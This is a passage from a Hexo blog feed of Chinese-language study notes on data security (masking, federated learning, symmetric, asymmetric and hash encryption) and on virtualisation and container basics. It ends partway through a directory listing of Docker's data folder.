  </entry>
  
  
  
  <entry>
    <title>datasec_base</title>
    <link href="/2024/12/16/security/datasec/datasec_base/"/>
    <url>/2024/12/16/security/datasec/datasec_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="数据安全技术"><a href="#数据安全技术" class="headerlink" title="数据安全技术"></a>数据安全技术</h2><h3 id="数据加密技术"><a href="#数据加密技术" class="headerlink" title="数据加密技术"></a>数据加密技术</h3><h3 id="数据脱敏技术"><a href="#数据脱敏技术" class="headerlink" title="数据脱敏技术"></a>数据脱敏技术</h3><h4 id="数据屏蔽（Masking）"><a href="#数据屏蔽（Masking）" class="headerlink" title="数据屏蔽（Masking）"></a>数据屏蔽（Masking）</h4><h5 id="数据屏蔽原理"><a href="#数据屏蔽原理" class="headerlink" title="数据屏蔽原理"></a>数据屏蔽原理</h5><p>将敏感数据的部分或全部内容通过特定的字符或符号替换真实信息。</p><p>例如：用*或x替换手机号指定几位</p><p>在实现时，要确定屏蔽的位置和屏蔽字符的规则，以达到既能隐藏敏感信息，又能保留数据部分特征的目的。</p><h5 id="数据屏蔽场景及优势"><a href="#数据屏蔽场景及优势" class="headerlink" title="数据屏蔽场景及优势"></a>数据屏蔽场景及优势</h5><p>能够在保持数据格式完整性的同时，有效地隐藏敏感信息，让用户对数据的大致格式和类型有直观的了解。</p><h4 id="数据替换（Substitution）"><a href="#数据替换（Substitution）" class="headerlink" title="数据替换（Substitution）"></a>数据替换（Substitution）</h4><h5 id="数据替换原理"><a href="#数据替换原理" class="headerlink" title="数据替换原理"></a>数据替换原理</h5><p>将敏感数据替换为虚拟的或通用的数据。</p><p>例如：</p><p>真实姓名替换为张三、李四这种通用名字</p><p>详细地址替换为大致区域</p><h5 id="数据替换场景及优势"><a href="#数据替换场景及优势" class="headerlink" title="数据替换场景及优势"></a>数据替换场景及优势</h5><p>适用于对数据真实性要求不高，但需要保护隐私的场景，例如软件开发过程中测试数据生成。</p><p>操作简单，可快速对大量数据操作，也可以在一定程度上保留数据格式和类型</p><h4 id="数据扰动（Perturbation）"><a href="#数据扰动（Perturbation）" class="headerlink" title="数据扰动（Perturbation）"></a>数据扰动（Perturbation）</h4><h5 id="数据扰动原理"><a href="#数据扰动原理" class="headerlink" title="数据扰动原理"></a>数据扰动原理</h5><p>对原始数据进行随机化处理，添加一定的随机误差，使得敏感信息无法被还原</p><h5 id="数据扰动场景及优势"><a href="#数据扰动场景及优势" class="headerlink" title="数据扰动场景及优势"></a>数据扰动场景及优势</h5><h4 id="数据匿名化（Anonymization）"><a href="#数据匿名化（Anonymization）" class="headerlink" title="数据匿名化（Anonymization）"></a>数据匿名化（Anonymization）</h4><h4 id="数据加密（Encryption）"><a href="#数据加密（Encryption）" class="headerlink" title="数据加密（Encryption）"></a>数据加密（Encryption）</h4><h3 id="数据访问控制技术"><a href="#数据访问控制技术" class="headerlink" title="数据访问控制技术"></a>数据访问控制技术</h3><h4 id="RBAC（基于角色的访问控制）模型"><a href="#RBAC（基于角色的访问控制）模型" class="headerlink" title="RBAC（基于角色的访问控制）模型"></a>RBAC（基于角色的访问控制）模型</h4><h4 id="ABAC（基于属性的访问控制）模型"><a href="#ABAC（基于属性的访问控制）模型" class="headerlink" title="ABAC（基于属性的访问控制）模型"></a>ABAC（基于属性的访问控制）模型</h4><h3 id="隐私计算技术"><a href="#隐私计算技术" class="headerlink" title="隐私计算技术"></a>隐私计算技术</h3><h4 id="隐私计算定义"><a href="#隐私计算定义" class="headerlink" title="隐私计算定义"></a>隐私计算定义</h4><p>是一种在保护数据隐私的前提下，实现数据价值挖掘和利用的技术体系。</p><p>允许数据所有者在不泄漏敏感信息的情况下，对数据进行计算、分析和共享等操作。</p><h4 id="隐私计算主要技术方向"><a href="#隐私计算主要技术方向" class="headerlink" title="隐私计算主要技术方向"></a>隐私计算主要技术方向</h4><h5 id="同态加密（Homomorphic-Encryption）"><a href="#同态加密（Homomorphic-Encryption）" class="headerlink" title="同态加密（Homomorphic Encryption）"></a>同态加密（Homomorphic Encryption）</h5><h6 id="同态加密原理"><a href="#同态加密原理" class="headerlink" title="同态加密原理"></a>同态加密原理</h6><h5 id="安全多方计算"><a href="#安全多方计算" class="headerlink" title="安全多方计算"></a>安全多方计算</h5><h5 id="联邦学习（Federated-Learning）"><a href="#联邦学习（Federated-Learning）" class="headerlink" title="联邦学习（Federated Learning）"></a>联邦学习（Federated Learning）</h5><h6 id="联邦学习原理"><a href="#联邦学习原理" class="headerlink" title="联邦学习原理"></a>联邦学习原理</h6><p>一种分布式机器学习方法，允许多个数据源（如不同的设备或机构）在本地数据上训练模型，然后将模型参数（如神经网络的权重）进行共享聚合，而不是直接共享数据。这样可以在保护数据隐私的基础上，利用各方的数据来训练一个更强大的全局模型。</p><h6 id="联邦学习分类"><a href="#联邦学习分类" class="headerlink" title="联邦学习分类"></a>联邦学习分类</h6><p><strong>集中式联邦学习</strong>：中央服务器负责协调学习过程，包括选择参与节点和聚合模型更新。</p><p><strong>去中心化联邦学习</strong>：允许节点自主协调获取全局模型，避免单点故障。</p><p><strong>异构联邦学习</strong>：支持具有不同计算和通信能力的异构本地模型训练，同时生成准确的全局推理模型。</p><h6 id="联邦学习一般流程"><a href="#联邦学习一般流程" class="headerlink" title="联邦学习一般流程"></a>联邦学习一般流程</h6><p>1、<strong>问题定义与参与方确定</strong></p><p><strong>明确目标</strong>：首先需要确定联邦学习要解决的问题，目标决定了后续的数据需求和模型类型。</p><p><strong>识别参与方</strong>：找出拥有相关数据且愿意参与联邦学习的各方。这些参与方可以是不同的机构（如多家医院、银行），也可以是不同的设备（如智能手机、物联网设备）。参与方需要具备一定的数据存储和计算能力，以便在本地进行数据处理。</p><p>2、<strong>数据准备与预处理</strong></p><p><strong>本地数据收集</strong>：每个参与方在本地收集用于训练模型的数据。这些数据通常是敏感的，不会离开本地设备或机构。</p><p><strong>数据清洗与特征工程（本地）</strong>：参与方在本地对数据进行清洗，去除噪声、错误数据和重复数据。同时，进行特征工程，如提取有用的特征、对特征进行编码或归一化等操作。</p><p>3、<strong>模型初始化与分发</strong></p><p><strong>模型选择与初始化</strong>：由协调者（可以是一个中立的第三方机构，也可以是参与方中的主导者）选择合适的机器学习模型架构，如神经网络、决策树等，并进行初始化，如设置权重和偏置参数。</p><p><strong>模型分发</strong>：将初始化后的模型参数发送给各个参与方。</p><p>4、<strong>本地模型训练</strong></p><p><strong>利用本地数据训练</strong>：各参与方在本地使用自己的数据对收到的模型进行训练。在训练过程中，模型根据本地数据的特征和标签，通过优化算法（如梯度下降）来调整模型参数，使模型在本地数据上的性能（如准确率、损失函数值）得到优化。</p><p><strong>计算梯度更新（本地）</strong>：在训练过程中，参与方计算模型参数的梯度更新。梯度表示模型参数对损失函数的变化率，用于指导模型参数的调整方向。</p><p>5、<strong>模型参数聚合</strong></p><p><strong>上传梯度更新或模型参数</strong>：参与方将本地计算的梯度更新或训练后的模型参数发送给协调者。这一步骤需要注意数据传输的安全性，通常会采用加密等手段来保护数据。例如，通过同态加密技术对梯度更新进行加密，使得协调者在接收数据时无法获取梯度中的隐私信息。</p><p><strong>聚合操作（协调者）</strong>：协调者收到来自各个参与方的梯度更新或模型参数后，进行聚合操作。对于梯度更新，聚合操作可以是简单的加权平均（根据参与方数据量、数据质量等因素确定权重）；对于模型参数，聚合操作可能更复杂，如对不同模型的参数进行融合。例如，在简单的线性回归模型联邦学习中，协调者将各参与方上传的梯度更新进行加权平均，然后更新全局模型的参数。</p><p>6、<strong>模型更新与评估</strong></p><p><strong>更新全局模型（协调者）</strong>：根据聚合后的结果，协调者更新全局模型的参数。</p><p><strong>模型评估（可选）</strong>：可以对更新后的全局模型进行评估，评估指标可以是准确率、召回率、F1 - 分数等（取决于具体的任务）。评估数据可以是预留的测试数据（这些测试数据也可以通过联邦学习的方式获取），或者是模拟数据。通过评估来判断模型是否达到预期的性能目标，如果没有达到，可能需要调整模型架构、训练策略或联邦学习的参数。</p><p>7、<strong>迭代训练与优化</strong></p><p><strong>循环训练过程</strong>：重复上述本地模型训练、模型参数聚合、模型更新与评估的步骤，直到全局模型达到满意的性能或者达到预定的训练次数。在每次迭代中，模型不断吸收各参与方的本地数据信息，逐步优化性能。</p><p><strong>优化调整（可选）</strong>：在迭代过程中，可以根据模型的性能表现和训练情况，对联邦学习的各个环节进行优化调整。例如，调整参与方的权重、更新数据预处理方法、改变模型架构等，以提高模型的收敛速度和最终性能。</p><h6 id="联邦学习优势"><a href="#联邦学习优势" class="headerlink" title="联邦学习优势"></a>联邦学习优势</h6><p><strong>保护隐私</strong>：由于数据不需要上传到中央服务器，用户的隐私得到了很好的保护。</p><p><strong>减少数据传输</strong>：只需传输模型参数，显著减少了数据传输的量。</p><p><strong>提高模型的泛化能力</strong>：由于模型是在不同设备上训练的，这些设备的数据分布可能会有所不同，因此最终的全局模型能够更好地适应不同用户的需求。</p><p><strong>利用边缘计算</strong>：联邦学习可以利用用户设备的计算能力，在边缘进行数据处理，减轻了中央服务器的负担。</p><p><strong>适应动态环境</strong>：联邦学习能够快速适应动态变化的环境。</p><h6 id="联邦学习应用"><a href="#联邦学习应用" class="headerlink" title="联邦学习应用"></a>联邦学习应用</h6><p>移动设备的个性化推荐系统</p><p>医疗领域的疾病预测模型</p><p>金融行业的反欺诈模型</p><h6 id="联邦学习挑战"><a href="#联邦学习挑战" class="headerlink" title="联邦学习挑战"></a>联邦学习挑战</h6><p><strong>数据异构性</strong>：不同设备的数据分布可能存在差异，这种异构性会影响模型的训练效果。</p><p><strong>通信效率</strong>：由于设备的网络环境可能不稳定，因此在联邦学习中，需要考虑如何减少通信开销。</p><p><strong>安全性</strong>：尽管联邦学习可以保护用户隐私，但仍然需要防范一些潜在的安全威胁，比如模型反向工程和恶意设备的影响。</p><h5 id="可信执行环境"><a href="#可信执行环境" class="headerlink" title="可信执行环境"></a>可信执行环境</h5><h5 id="差分隐私"><a href="#差分隐私" class="headerlink" title="差分隐私"></a>差分隐私</h5><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><p>【1】联邦学习：去中心化的机器学习新模式 川后静波 吴建明利驰软件 2024年10月09日 22:13</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2MDg5NzE5NA==&mid=2247491179&idx=1&sn=bfdb40f3d7bfef6b4ea294b7a6a96120&chksm=cf6915a369d37b516940c2c48eaae5ec7010335d389422a25ffbd87f910cefa04829fd5bd6d9#rd">https://mp.weixin.qq.com/s?__biz=Mzg2MDg5NzE5NA==&amp;mid=2247491179&amp;idx=1&amp;sn=bfdb40f3d7bfef6b4ea294b7a6a96120&amp;chksm=cf6915a369d37b516940c2c48eaae5ec7010335d389422a25ffbd87f910cefa04829fd5bd6d9#rd</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>datasec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>base</tag>
      
      <tag>datasec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>datasec_数据加密</title>
    <link href="/2024/12/16/security/datasec/datasec_%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"/>
    <url>/2024/12/16/security/datasec/datasec_%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="数据加密技术"><a href="#数据加密技术" class="headerlink" title="数据加密技术"></a>数据加密技术</h1><h2 id="对称加密技术"><a href="#对称加密技术" class="headerlink" title="对称加密技术"></a>对称加密技术</h2><h3 id="对称加密技术原理"><a href="#对称加密技术原理" class="headerlink" title="对称加密技术原理"></a>对称加密技术原理</h3><p>对称加密是指加密和解密使用相同密钥的加密算法。</p><p>发送方和接收方必须共享同一个密钥。</p><p>数据发送者通过密钥对数据进行加密，数据接收方通过密钥对数据进行解密</p><h3 id="对称加密技术优点"><a href="#对称加密技术优点" class="headerlink" title="对称加密技术优点"></a>对称加密技术优点</h3><h4 id="加密速度快"><a href="#加密速度快" class="headerlink" title="加密速度快"></a>加密速度快</h4><p>相同密钥加解密</p><h4 id="算法简单易懂"><a href="#算法简单易懂" class="headerlink" title="算法简单易懂"></a>算法简单易懂</h4><p>原理直观，容易理解和实现</p><h3 id="对称加密技术缺点"><a href="#对称加密技术缺点" class="headerlink" title="对称加密技术缺点"></a>对称加密技术缺点</h3><h4 id="密钥管理困难"><a href="#密钥管理困难" class="headerlink" title="密钥管理困难"></a>密钥管理困难</h4><p>由于相同密钥，存在密钥分发，需要保障密钥安全性，尤其在密钥传输和存储阶段</p><h4 id="安全性相对较低"><a href="#安全性相对较低" class="headerlink" title="安全性相对较低"></a>安全性相对较低</h4><p>由于相同密钥，需要加解密双方共享密钥，如果密钥被泄露，就丧失了安全性</p><h3 id="常见对称加密算法"><a href="#常见对称加密算法" class="headerlink" title="常见对称加密算法"></a>常见对称加密算法</h3><h4 id="DES（数据加密标准）"><a href="#DES（数据加密标准）" class="headerlink" title="DES（数据加密标准）"></a>DES（数据加密标准）</h4><p>经典的对称加密算法，将数据分为64位的块进行加密。</p><p>由于密钥长度较短，只有56位，目前已被认为安全性不够</p><h4 id="3DES（3重数据加密标准）"><a href="#3DES（3重数据加密标准）" class="headerlink" title="3DES（3重数据加密标准）"></a>3DES（3重数据加密标准）</h4><p>DES加密算法改进版，对数据进行 3 次DES加密操作，使用两个或三个56位密钥</p><p>安全性有所增加，加密速度相对较慢</p><h4 id="AES（高级数据加密标准）"><a href="#AES（高级数据加密标准）" class="headerlink" title="AES（高级数据加密标准）"></a>AES（高级数据加密标准）</h4><p>目前广泛使用的对称加密算法之一</p><p>支持128位、192位和256位的密钥长度，能够对128位的数据进行高效加密</p><p>例如：存储敏感信息（数据密码）、网络通信（VPN数据传输）常用AES加密</p><h3 id="对称加密密钥传输安全"><a href="#对称加密密钥传输安全" class="headerlink" title="对称加密密钥传输安全"></a>对称加密密钥传输安全</h3><h4 id="应用密钥交换协议"><a href="#应用密钥交换协议" class="headerlink" title="应用密钥交换协议"></a>应用密钥交换协议</h4><h5 id="Diffie-Hellman-密钥交换协议"><a href="#Diffie-Hellman-密钥交换协议" class="headerlink" title="Diffie - Hellman 密钥交换协议"></a>Diffie - Hellman 密钥交换协议</h5><p>一种常用的密钥交换方法，它允许双方在不安全的通信信道上建立共享的密钥。其核心是基于离散对数问题的数学原理。</p><h5 id="椭圆曲线-Diffie-Hellman（ECDH）密钥交换协议"><a href="#椭圆曲线-Diffie-Hellman（ECDH）密钥交换协议" class="headerlink" title="椭圆曲线 Diffie - Hellman（ECDH）密钥交换协议"></a>椭圆曲线 Diffie - Hellman（ECDH）密钥交换协议</h5><p>Diffie - Hellman 密钥交换协议的一种变体，它基于椭圆曲线密码学（ECC）。在椭圆曲线上，点的运算（如加法和乘法）具有特定的数学性质。通信双方通过在椭圆曲线上进行点的运算来交换密钥。</p><h4 id="使用安全通道进行传输"><a href="#使用安全通道进行传输" class="headerlink" title="使用安全通道进行传输"></a>使用安全通道进行传输</h4><h5 id="SSL-TLS-协议保障"><a href="#SSL-TLS-协议保障" class="headerlink" title="SSL&#x2F;TLS 协议保障"></a>SSL&#x2F;TLS 协议保障</h5><p>SSL 安全套接字</p><p>TLS 传输层安全</p><p>SSL&#x2F;TLS 协议采用多种加密和认证技术。在加密方面，它可以使用公钥加密（如 RSA）来交换对称加密密钥，确保密钥的保密性。在认证方面，通过数字证书来验证通信双方的身份，防止中间人攻击。数字证书包含了公钥和相关机构的签名，接收方可以通过验证签名来确认公钥的真实性，从而保证密钥传输是在合法的双方之间进行。</p><h5 id="VPN（虚拟专用网络）辅助传输"><a href="#VPN（虚拟专用网络）辅助传输" class="headerlink" title="VPN（虚拟专用网络）辅助传输"></a>VPN（虚拟专用网络）辅助传输</h5><p>VPN 采用多种安全技术，如 IPsec 协议。IPsec 可以对数据进行加密和认证，确保数据的保密性、完整性和来源真实性。在传输对称密钥时，通过 IPsec 的加密功能，能够防止密钥在传输过程中被窃取或篡改，同时通过认证功能防止非法用户接入 VPN 通道获取密钥。</p><h4 id="应用密钥的预共享和密钥管理系统"><a href="#应用密钥的预共享和密钥管理系统" class="headerlink" title="应用密钥的预共享和密钥管理系统"></a>应用密钥的预共享和密钥管理系统</h4><h5 id="预共享密钥（PSK）"><a href="#预共享密钥（PSK）" class="headerlink" title="预共享密钥（PSK）"></a>预共享密钥（PSK）</h5><p>预共享密钥是一种在通信之前预先共享密钥的方式。</p><p>虽然预共享密钥简单方便，但也存在一定的安全风险。如果密钥被泄露，整个通信系统的安全将受到威胁。因此，对于预共享密钥的存储和使用需要采取严格的安全措施，如将密钥存储在安全的硬件设备（如硬件安全模块 - HSM）中，限制密钥的访问权限，并且定期更换密钥。</p><h5 id="密钥管理系统（KMS）"><a href="#密钥管理系统（KMS）" class="headerlink" title="密钥管理系统（KMS）"></a>密钥管理系统（KMS）</h5><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>密钥管理系统是一种集中管理密钥的软件或硬件解决方案。它可以生成、存储、分发、更新和销毁密钥。在对称加密密钥传输过程中，KMS 可以发挥重要作用。例如，KMS 首先生成对称加密密钥，然后通过安全的方式（如上述的密钥交换协议或安全通道）将密钥分发给需要的用户或设备。同时，KMS 可以记录密钥的使用情况，对密钥进行加密存储，并且在密钥可能泄露或过期时及时进行更新或销毁。</p><h6 id="安全增强措施"><a href="#安全增强措施" class="headerlink" title="安全增强措施"></a>安全增强措施</h6><p>KMS 本身采用多种安全措施来保证密钥传输的安全。它可以使用多层加密技术，如对存储的密钥进行加密，并且在传输过程中再次加密。同时，KMS 具有严格的访问控制机制，只有经过授权的用户或系统才能访问和操作密钥，并且所有操作都有详细的审计记录，以确保密钥传输和使用过程的安全性。</p><h2 id="非对称加密技术"><a href="#非对称加密技术" class="headerlink" title="非对称加密技术"></a>非对称加密技术</h2><h3 id="非对称加密技术原理"><a href="#非对称加密技术原理" class="headerlink" title="非对称加密技术原理"></a>非对称加密技术原理</h3><p>非对称加密使用一对密钥，即公钥和私钥</p><p>数据加密方面：加密方使用公钥进行加密，解密方使用私钥进行解密</p><p>数据签名方面：签名方使用私钥进行签名，解密方使用公钥进行解密验证真实性</p><h3 id="常见非对称加密算法"><a href="#常见非对称加密算法" class="headerlink" title="常见非对称加密算法"></a>常见非对称加密算法</h3><h4 id="RSA（Rivest-Shamir-Adleman）"><a href="#RSA（Rivest-Shamir-Adleman）" class="headerlink" title="RSA（Rivest - Shamir - Adleman）"></a>RSA（Rivest - Shamir - Adleman）</h4><p>最著名的非对称加密算法之一</p><p>基于数论中的大整数分解问题，密钥长度通常在1024位以上</p><p>例如：在数字证书、SSL&#x2F;TLS 协议（用于验证服务器身份）以及安全电子邮件（如 PGP 加密）等场景中广泛使用 RSA</p><h4 id="ECC（椭圆曲线密码体制）"><a href="#ECC（椭圆曲线密码体制）" class="headerlink" title="ECC（椭圆曲线密码体制）"></a>ECC（椭圆曲线密码体制）</h4><p>基于椭圆曲线离散对数问题</p><p>相比于RSA，可以使用更短的密钥长度达到相同甚至更高的安全性</p><p>例如：在资源受限的设备（如移动设备、物联网设备）中，ECC 因其高效性而被广泛应用于安全通信和身份认证。</p><h3 id="非对称加密技术优势"><a href="#非对称加密技术优势" class="headerlink" title="非对称加密技术优势"></a>非对称加密技术优势</h3><h4 id="安全性高"><a href="#安全性高" class="headerlink" title="安全性高"></a>安全性高</h4><p>非对称加密使用公钥和私钥进行加密和解密，公钥公开，私钥保密，提高了数据传输的安全性</p><h4 id="密钥管理方便"><a href="#密钥管理方便" class="headerlink" title="密钥管理方便"></a>密钥管理方便</h4><p>在通信双方之间，不需要共享密钥，只需交换公钥即可进行加密通信，简化了密钥管理和分发的过程</p><h4 id="数字签名功能"><a href="#数字签名功能" class="headerlink" title="数字签名功能"></a>数字签名功能</h4><p>非对称加密可以用于数字签名，验证数据的完整性和真实性，保证通信的安全性</p><h3 id="非对称加密技术劣势"><a href="#非对称加密技术劣势" class="headerlink" title="非对称加密技术劣势"></a>非对称加密技术劣势</h3><h4 id="性能较低"><a href="#性能较低" class="headerlink" title="性能较低"></a>性能较低</h4><p>相较对称加密，非对称加密算法的加密解密速度较慢，特别是在处理大量数据时，会造成性能上的损耗</p><h4 id="密钥长度较长"><a href="#密钥长度较长" class="headerlink" title="密钥长度较长"></a>密钥长度较长</h4><p>为了确保安全性，非对称加密需要使用较长的密钥长度，相对占用的存储空间和传输开销较大</p><h4 id="部分算法安全性问题"><a href="#部分算法安全性问题" class="headerlink" title="部分算法安全性问题"></a>部分算法安全性问题</h4><p>非对称加密算法，如RSA的安全性基于数学难题，如大素数分解，随着计算效率的提高，存在被攻破的风险</p><h3 id="非对称加密技术应用场景"><a href="#非对称加密技术应用场景" class="headerlink" title="非对称加密技术应用场景"></a>非对称加密技术应用场景</h3><p>数字签名</p><p>身份认证</p><p>密钥交换：可以通过非对称加密安全地交换对称加密所需的密钥</p><h2 id="哈希加密技术"><a href="#哈希加密技术" class="headerlink" title="哈希加密技术"></a>哈希加密技术</h2><h3 id="哈希加密技术原理"><a href="#哈希加密技术原理" class="headerlink" title="哈希加密技术原理"></a>哈希加密技术原理</h3><p>单向加密算法</p><p>将任意长度数据转换为固定长度的哈希值，也称为消息摘要</p><p>具有不可逆性，即无法从哈希值反推出原始数据</p><p>验证数据完整性：相同的数据输入会产生相同的哈希值</p><h3 id="哈希加密技术算法"><a href="#哈希加密技术算法" class="headerlink" title="哈希加密技术算法"></a>哈希加密技术算法</h3><h4 id="MD5（消息摘要算法第5版）"><a href="#MD5（消息摘要算法第5版）" class="headerlink" title="MD5（消息摘要算法第5版）"></a>MD5（消息摘要算法第5版）</h4><p>曾被广泛应用</p><p>由于安全性存在严重的问题，如容易产生碰撞，即不同的数据可能产生相同的哈希值</p><p>目前已不建议用于安全敏感的场合</p><h4 id="SHA-1（安全哈希算法1）"><a href="#SHA-1（安全哈希算法1）" class="headerlink" title="SHA-1（安全哈希算法1）"></a>SHA-1（安全哈希算法1）</h4><p>160 位的哈希值长度在面对强大的计算能力攻击时可能不够安全</p><h4 id="SHA-2（安全哈希算法2）系列"><a href="#SHA-2（安全哈希算法2）系列" class="headerlink" title="SHA-2（安全哈希算法2）系列"></a>SHA-2（安全哈希算法2）系列</h4><p>SHA-224</p><p>SHA-256</p><p>目前安全性能较高的哈希算法</p><p>SHA - 256 常用于区块链技术（如比特币中用于验证交易的完整性）、文件完整性验证（如下载文件时验证文件是否被篡改）等场景</p><h4 id="SHA-3（安全哈希算法3）"><a href="#SHA-3（安全哈希算法3）" class="headerlink" title="SHA-3（安全哈希算法3）"></a>SHA-3（安全哈希算法3）</h4><h3 id="哈希加密技术应用场景"><a href="#哈希加密技术应用场景" class="headerlink" title="哈希加密技术应用场景"></a>哈希加密技术应用场景</h3><p>密码存储</p><p>数据完整性验证</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>datasec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>datasec</tag>
      
      <tag>数据加密</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tthours</title>
    <link href="/2024/12/16/tthours/"/>
    <url>/2024/12/16/tthours/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p><img src="/image-20241224173609469.png" alt="image-20241224173609469"></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cloudsec_base</title>
    <link href="/2024/12/16/security/cloudsec/cloudsec_base/"/>
    <url>/2024/12/16/security/cloudsec/cloudsec_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="云原生基础概念"><a href="#云原生基础概念" class="headerlink" title="云原生基础概念"></a>云原生基础概念</h1><h2 id="qemu-kvm"><a href="#qemu-kvm" class="headerlink" title="qemu-kvm"></a>qemu-kvm</h2><h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><h4 id="qemu原理"><a href="#qemu原理" class="headerlink" title="qemu原理"></a>qemu原理</h4><p>qemu 是通过软件实现的虚拟化模拟器，可以模拟大多数硬件设备，可以通过 qemu 模拟虚拟机，模拟出来的虚拟机与之交互的硬件就是 qemu 模拟出来的硬件，qemu 模拟的硬件将从虚拟机接收过来的指令转译给真正的硬件。</p><h4 id="qemu优势"><a href="#qemu优势" class="headerlink" title="qemu优势"></a>qemu优势</h4><h4 id="qemu劣势"><a href="#qemu劣势" class="headerlink" title="qemu劣势"></a>qemu劣势</h4><p>由于 qemu 是基于软件的，指令需要 qemu 进行转译，所以速度会相对较慢一些。</p><h3 id="KVM"><a href="#KVM" class="headerlink" title="KVM"></a>KVM</h3><p>kernel-based Virtual Machine</p><h4 id="KVM原理"><a href="#KVM原理" class="headerlink" title="KVM原理"></a>KVM原理</h4><p>硬件辅助的虚拟化技术。</p><p>kvm 是 linux 的内核模块,用于模拟 CPU 和内存。</p><h4 id="KVM优势"><a href="#KVM优势" class="headerlink" title="KVM优势"></a>KVM优势</h4><p>由于是基于linux内核的，所以模拟出来的虚拟机的 CPU 指令会直接和真正的硬件进行交互，因此速度会更加快速</p><h4 id="KVM劣势"><a href="#KVM劣势" class="headerlink" title="KVM劣势"></a>KVM劣势</h4><h3 id="qemu-kvm-1"><a href="#qemu-kvm-1" class="headerlink" title="qemu-kvm"></a>qemu-kvm</h3><h4 id="qemu-kvm原理"><a href="#qemu-kvm原理" class="headerlink" title="qemu-kvm原理"></a>qemu-kvm原理</h4><p>由于 qemu 和 kvm 单独使用都会存在一些不满意的地方，所以 qemu 将 kvm 整合，使用 ioctl 调用 &#x2F;dev&#x2F;kvm 接口，将相关 CPU 的指令直接交由 内核进行处理。</p><p>kvm 模拟 CPU 和内存，实现CPU和内存的虚拟化；qemu 模拟 IO 设备，实现 IO 的虚拟化。通过两者实现服务器的虚拟化，所以就是 qemu-kvm。</p><h2 id="容器技术"><a href="#容器技术" class="headerlink" title="容器技术"></a>容器技术</h2><h3 id="容器和虚拟化"><a href="#容器和虚拟化" class="headerlink" title="容器和虚拟化"></a>容器和虚拟化</h3><p><strong>虚拟化：Vritualization</strong></p><p>通常在hypervisor层实现对硬件资源的虚拟化，hypervisor为虚拟机提供了虚拟的运行平台，管理虚拟机的操作系统的运行，每个虚拟机都有自己的操作系统、系统库和应用</p><p><strong>容器：Container</strong></p><p>没有hypervisor层，每个容器是与主机共享硬件资源及操作系统</p><p>在操作系统层面实现了对计算机系统资源的虚拟化，在操作系统中对CPU、内存和文件系统等资源的隔离划分和控制，实现进程之间透明的资源使用。</p><h3 id="容器镜像"><a href="#容器镜像" class="headerlink" title="容器镜像"></a>容器镜像</h3><p>镜像是容器运行的基础，容器引擎可使用不同的镜像启动相应的容器</p><p>虚拟机镜像是将完整的操作系统封装成一个镜像文件</p><p>容器镜像不是一个文件，是分层存储的文件系统，所以如果对镜像内某个文件修改时，只是修改的最上方的读写层，不会覆盖下层已有的文件系统</p><h3 id="容器存储"><a href="#容器存储" class="headerlink" title="容器存储"></a>容器存储</h3><h4 id="镜像元数据"><a href="#镜像元数据" class="headerlink" title="镜像元数据"></a>镜像元数据</h4><p>Linux系统中docker的数据默认存储在&#x2F;var&#x2F;lib&#x2F;docker中</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs tap">└─<span class="hljs-comment"># ls -l /var/lib/docker</span><br>总用量 44<br>drwx--x--x <span class="hljs-number"> 4 </span>root root<span class="hljs-number"> 4096 </span> 4月<span class="hljs-number"> 22 </span>19:08 buildkit<br>drwx--x--- <span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span> 7月 <span class="hljs-number"> 5 </span>09:00 containers<br>drwx------ <span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span> 4月<span class="hljs-number"> 22 </span>19:08 image<br>drwxr-x--- <span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span> 4月<span class="hljs-number"> 22 </span>19:08 network<br>drwx--x---<span class="hljs-number"> 26 </span>root root<span class="hljs-number"> 4096 </span> 7月 <span class="hljs-number"> 5 </span>09:00 overlay2<br>drwx------ <span class="hljs-number"> 4 </span>root root<span class="hljs-number"> 4096 </span> 4月<span class="hljs-number"> 22 </span>19:08 plugins<br>drwx------ <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span> 7月 <span class="hljs-number"> 3 </span>11:05 runtimes<br>drwx------ <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span> 4月<span class="hljs-number"> 22 </span>19:08 swarm<br>drwx------ <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span> 7月 <span class="hljs-number"> 4 </span>09:33 tmp<br>drwx------ <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span> 4月<span class="hljs-number"> 22 </span>19:08 trust<br>drwx-----x<span class="hljs-number"> 17 </span>root root<span class="hljs-number"> 4096 </span> 7月 <span class="hljs-number"> 5 </span>09:00 